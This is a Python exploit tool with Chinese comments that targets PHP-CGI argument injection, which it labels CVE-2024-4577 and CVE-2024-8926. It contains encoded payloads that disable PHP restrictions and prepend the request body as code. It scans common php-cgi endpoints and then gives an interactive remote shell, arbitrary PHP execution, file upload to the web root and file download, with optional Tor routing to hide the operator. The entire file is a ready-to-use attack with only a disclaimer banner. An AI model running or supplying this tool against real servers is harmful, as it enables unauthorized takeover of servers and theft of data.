import requests
import sys
import urllib3
import chardet
import os
import re
from urllib.parse import urlparse
import banner
import tor_helper

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Payload List
PAYLOAD_GROUPS = {
    # 之後可以擴展其他組 Payload
    "1": {
        "CVE-2024-4577": "%ADd+disable_functions%3d%26+%ADd+disable_classes%3d%26+%ADd+open_basedir%3d+%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+allow_url_fopen%3d1+%ADd+auto_prepend_file%3dphp://input",
        "CVE-2024-8926": "%a8-d%a8+disable_functions%3d%26+%a8-d%a8+disable_classes%3d%26+%a8-d%a8+open_basedir%3d+%a8-d%a8+cgi.force_redirect%3d0+%a8-d%a8+cgi.redirect_status_env+%a8-d%a8+allow_url_include%3d1+%a8-d%a8+allow_url_fopen%3d1+%a8-d%a8+auto_prepend_file%3dphp://input"
    },
    "2": {
        "CVE-2024-4577": "%ADd+disable_functions%3d%26+%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
        "CVE-2024-8926": "%a8-d%a8+disable_functions%3d%26+%a8-d%a8+cgi.force_redirect%3d0+%a8-d%a8+cgi.redirect_status_env+%a8-d%a8+allow_url_include%3d1+%a8-d%a8+auto_prepend_file%3dphp://input"
    },
    "3": {
        "CVE-2024-4577": "%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
        "CVE-2024-8926": "%a8-d%a8+cgi.force_redirect%3d0+%a8-d%a8+cgi.redirect_status_env+%a8-d%a8+allow_url_include%3d1+%a8-d%a8+auto_prepend_file%3dphp://input"
    }
}

# 全域設定
DEFAULT_TIMEOUT = 10
timeout_value = DEFAULT_TIMEOUT
enable_log = "--log" in sys.argv
use_tor = "--tor" in sys.argv  # 檢查是否啟用 Tor
tor_session = None 
selected_payload_group = "1" # 預設payload

# Payload List排版
def format_payload(payload):
    
    parts = re.split(r'(%AD|%a8)', payload)  # 依 `%AD` 和 `%a8` 分割
    
    ad_count = 0  # 計算 `%AD` 的出現次數
    a8_count = 0  # 計算 `%a8` 的出現次數
    formatted_parts = []

    for part in parts:
        if part == "%AD":
            ad_count += 1
            if ad_count >= 2:  # 從第二個 `%AD` 開始換行
                formatted_parts.append("\n     " + part)
            else:
                formatted_parts.append(part)
        elif part == "%a8":
            a8_count += 1
            if a8_count % 2 == 1 and a8_count >= 3:  # 奇數次（從第 3 次開始）換行
                formatted_parts.append("\n     " + part)
            else:
                formatted_parts.append(part)
        else:
            formatted_parts.append(part)

    return ''.join(formatted_parts)

# Payload選擇
def get_selected_payload_group(args):
    global selected_payload_group

    selected_payload_group = "1"

    for i, arg in enumerate(args):
        if arg == "--payload":
            if i + 1 < len(args) and args[i + 1] in PAYLOAD_GROUPS:
                selected_payload_group = args[i + 1]
            else:
                print("\n[!] 可用的 Payload 組合：")
                for idx in sorted(PAYLOAD_GROUPS.keys()):
                    print(f"{idx}) 使用以下 Payloads:")
                    for name, payload in PAYLOAD_GROUPS[idx].items():
                        print(f"   - {name}: \n     {format_payload(payload)}")

                while True:
                    user_choice = input("[?] 請輸入對應的編號來切換 Payload 組: ").strip()
                    if user_choice in PAYLOAD_GROUPS:
                        selected_payload_group = user_choice
                        break
                    else:
                        print("[!] 無效輸入，請輸入正確的數字！")

    return selected_payload_group, PAYLOAD_GROUPS[selected_payload_group]

# 自動轉換編碼
def decode_response(response):
    detected = chardet.detect(response.content)
    encoding = detected.get('encoding')
    return response.content.decode(encoding, errors='replace') if encoding else response.content.decode('utf-8', errors='replace')

# 發送請求
def send_request(url, data, timeout=None):
    try:
        if isinstance(data, str):
            data = data.encode("utf-8")  # 確保 data 內容為 UTF-8
        
        if use_tor:
            response = tor_session.post(url, data=data, timeout=timeout)
        else:
            response = requests.post(url, data=data, verify=False, timeout=timeout)
        
        return decode_response(response)
    except Exception as e:
        print(f"[!] 請求錯誤: {e}")
        return None

# 枚舉注入點
def choose_cgipoint(url, payload_key):
    cgipoints = [
        "/php-cgi/php-cgi.exe", "/cgi-bin/php-cgi.exe",
        "/php-cgi.exe", "/cgi/php-cgi.exe", "/php.exe",
        "/cgi-bin/php.exe", "/cgi/php.exe",
        "/index.php", "/"
    ]
    test_payload = "<?php echo 'TEST_VULNTEST_CVE-2024-4577'; die(); ?>"
    for ep in cgipoints:
        target_url = f"{url}{ep}?{PAYLOADS[payload_key]}"
        resp = send_request(target_url, test_payload, timeout_value)
        if resp and 'TEST_VULNTEST_CVE-2024-4577' in resp:
            print(f"[+] 找到漏洞入口 : {ep} (漏洞: {payload_key})")
            return ep
    print(f"[-] 未找到漏洞 (CVE: {payload_key})")
    return None

# 移除不能用於檔名的字元
def sanitize_filename(filename):
    return re.sub(r'[\/:*?"<>|]', '_', filename)

# 以攻擊目標的 host 為基礎建立檔案名稱
def get_unique_filepath(directory, host):

    base_filename = sanitize_filename(host)
    candidate = os.path.join(directory, f"{base_filename}.txt")
    i = 1
    while os.path.exists(candidate):
        candidate = os.path.join(directory, f"{base_filename}_{i}.txt")
        i += 1
    return candidate

# 交互式shell
def exploit_shell(url, cgipoint, payload_key):
    print("[*] 輸入命令，輸入 exit 結束，可使用 --save 儲存單次輸出：")
    host = urlparse(url).netloc  # 取得目標網站的 host
    log_dir = os.path.join(os.getcwd(), "log")
    if enable_log and not os.path.exists(log_dir):
        os.makedirs(log_dir)  # 確保 log 目錄存在
    log_path = os.path.join(log_dir, f"{host}.log") if enable_log else None

    while True:
        cmd = input("shell> ").strip()
        if cmd.lower() == "exit":
            break

        parts = cmd.split("--save")
        real_cmd = parts[0].strip()
        save_path = parts[1].strip() if len(parts) > 1 else None

        # 自動產生合法的儲存檔名 (以 Host 命名並自動編號)
        if save_path == "":
            save_dir = os.path.join(os.getcwd(), "output")
            if not os.path.exists(save_dir):
                os.makedirs(save_dir)
            save_path = get_unique_filepath(save_dir, host)  # 改為使用 Host

        payload = f"<?php system('{real_cmd}'); die(); ?>"
        target_url = f"{url}{cgipoint}?{PAYLOADS[payload_key]}"
        resp = send_request(target_url, payload, timeout_value)
        output = resp.strip() if resp else ""

        print(output)

        if save_path:
            save_path = os.path.abspath(save_path)
            with open(save_path, "w", encoding="utf-8") as f:
                f.write(output)
            print(f"[+] 輸出結果已儲存至 {save_path}")

        if enable_log:
            with open(log_path, "a", encoding="utf-8") as f:
                f.write(f"CMD: {real_cmd}\n{output}\n{'-'*20}\n")

# 自訂php
def custom_php_mode(url, cgipoint, payload_key):
    print("[*] 輸入PHP程式碼，輸入 EOF 結束，可使用 --save 儲存輸出：")
    php_code = ""
    save_path = None
    host = urlparse(url).netloc  # 取得 Host，作為預設儲存檔名

    while True:
        line = input()
        if line.strip().startswith("EOF"):
            parts = line.split("--save")
            if len(parts) > 1:
                save_path = parts[1].strip()
                if save_path == "":
                    save_dir = os.path.join(os.getcwd(), "output")
                    if not os.path.exists(save_dir):
                        os.makedirs(save_dir)
                    save_path = get_unique_filepath(save_dir, host)  # 改為使用 Host
            break
        php_code += line + "\n"

    payload = f"<?php {php_code}; die(); ?>"
    target_url = f"{url}{cgipoint}?{PAYLOADS[payload_key]}"
    resp = send_request(target_url, payload, timeout_value)
    output = resp.strip() if resp else ""

    print(output)

    if save_path:
        save_path = os.path.abspath(save_path)
        with open(save_path, "w", encoding="utf-8") as f:
            f.write(output)
        print(f"[+] PHP輸出結果已儲存至 {save_path}")

# 取得目標網站的根目錄
def get_remote_docroot(url, cgipoint, payload_key):
    payload = "<?php echo $_SERVER['DOCUMENT_ROOT']; die(); ?>"
    target_url = f"{url}{cgipoint}?{PAYLOADS[payload_key]}"
    resp = send_request(target_url, payload, timeout_value)
    return resp.strip() if resp else None
    
# 上傳檔案
def upload_file(url, cgipoint, payload_key):
    local = input("本地檔案路徑：").strip()
    remote = input("目標完整路徑（若留空將上傳至網站根目錄）：").strip()
    
    if remote == "":
        docroot = get_remote_docroot(url, cgipoint, payload_key)
        if docroot:
            remote = os.path.join(docroot, os.path.basename(local)).replace("\\", "/")
            print(f"[*] 已自動設定上傳路徑為: {remote}")
        else:
            print("[!] 無法取得網站根目錄，請手動指定完整路徑")
            return

    try:
        with open(local, "rb") as f:
            encoded = base64.b64encode(f.read()).decode()
    except Exception as e:
        print(f"[!] 讀取本地檔案失敗: {e}")
        return
    
    payload = f"<?php file_put_contents('{remote}', base64_decode('{encoded}')); echo 'OK'; die(); ?>"
    resp = send_request(f"{url}{cgipoint}?{PAYLOADS[payload_key]}", payload)

    if resp and "OK" in resp:
        print(f"[+] 成功上傳至 {remote}")
    else:
        print("[!] 上傳失敗，無回應")

# 下載檔案
def download_file(url, cgipoint, payload_key):
    remote = input("遠端檔案路徑：").strip()
    local = os.path.join("download", os.path.basename(remote))
    if not os.path.exists("download"):
        os.makedirs("download")
    payload = f"<?php echo base64_encode(file_get_contents('{remote}')); die(); ?>"
    resp = send_request(f"{url}{cgipoint}?{PAYLOADS[payload_key]}", payload)
    if resp:
        with open(local, "wb") as f:
            f.write(base64.b64decode(resp.strip()))
        print(f"已下載至 {local}")

if __name__ == "__main__":

    if len(sys.argv) < 3 or sys.argv[1] != "-u":
        print("用法: python exploit.py -u <URL> [--timeout=秒] [--log] [--payload num] [--tor]")
        sys.exit(1)

    target = sys.argv[2] 
    
    # 播放開頭動畫
    use_tor = "--tor" in sys.argv
    banner.play_banner(use_tor)

    # 播放 Disclaimer
    banner.Show_Disclaimer()
    
    # 啟用 --tor 模式
    if use_tor:
        tor_session = tor_helper.get_tor_session()
        if not tor_session:
            sys.exit(1)  # Tor 無法啟動，終止腳本

    # 解析 `--payload`
    selected_payload_group, selected_payloads = get_selected_payload_group(sys.argv)
    PAYLOADS = selected_payloads  # 設定 PAYLOADS，確保 `choose_cgipoint()` 正常運作
     
    # timeout 檢查邏輯
    timeout_value = 10  # 預設值
    for arg in sys.argv:
        if arg.startswith("--timeout="):  # 確保有 `=`
            parts = arg.split("=")
            if len(parts) != 2 or not parts[1].isdigit():
                print("[!] 錯誤：請使用正確格式 --timeout=<秒數>，例如 --timeout=10")
                sys.exit(1)
            timeout_int = int(parts[1])
            if timeout_int == 0:
                timeout_value = None  # 無限等待
                print("[*] 已設置為無限等待")
            elif timeout_int > 60:
                print("[!] 等待時間過久 (超過 60 秒)，如需要無限等待請使用 --timeout=0")
                sys.exit(1)
            elif timeout_int > 30:
                print("[!] 警告：timeout 超過 30 秒，測試可能會耗時較久")
                timeout_value = timeout_int
            else:
                timeout_value = timeout_int
                print(f"[*] 設定請求超時時間為 {timeout_value} 秒")
        elif arg == "--timeout":  # 如果 `--timeout` 沒有 `=`
            print("[!] 錯誤：請使用 --timeout=<秒數>，例如 --timeout=10")
            sys.exit(1)
    while True:
        selected_cgipoint, selected_payload = None, None
        print("[*] 開始測試...")
        for p in PAYLOADS:
            ep = choose_cgipoint(target, p)
            if ep:
                selected_cgipoint, selected_payload = ep, p
                break
        if not selected_cgipoint:
            print("[-] 無漏洞，請重新指定目標或退出")

        while selected_cgipoint:
            print(f"\n[*] 當前目標: {target} (漏洞: {selected_payload})")
            print("模式選擇:")
            print("1) Shell模式 (使用system()執行命令)")
            print("2) PHP自訂義模式 (使用eval()執行任意代碼)")
            print("3) 上傳檔案")
            print("4) 下載檔案")
            print("5) 切換攻擊目標")
            print("6) 離開程式")

            choice = input(">> ").strip()
            if choice == "1":
                exploit_shell(target, selected_cgipoint, selected_payload)
            elif choice == "2":
                custom_php_mode(target, selected_cgipoint, selected_payload)
            elif choice == "3":
                upload_file(target, selected_cgipoint, selected_payload)
            elif choice == "4":
                download_file(target, selected_cgipoint, selected_payload)
            elif choice == "5":
                target = input("輸入新目標URL: ").strip()
                break
            elif choice == "6":
                print("[*] 程式結束")
                sys.exit(0)
            else:
                print("[!] 無效的選擇，請重新選擇")

        if not selected_cgipoint:
            next_action = input("1) 重新輸入目標  2) 離開\n>> ").strip()
            if next_action == "1":
                target = input("輸入新目標URL: ").strip()
            else:
                print("[*] 程式結束")
                sys.exit(0)
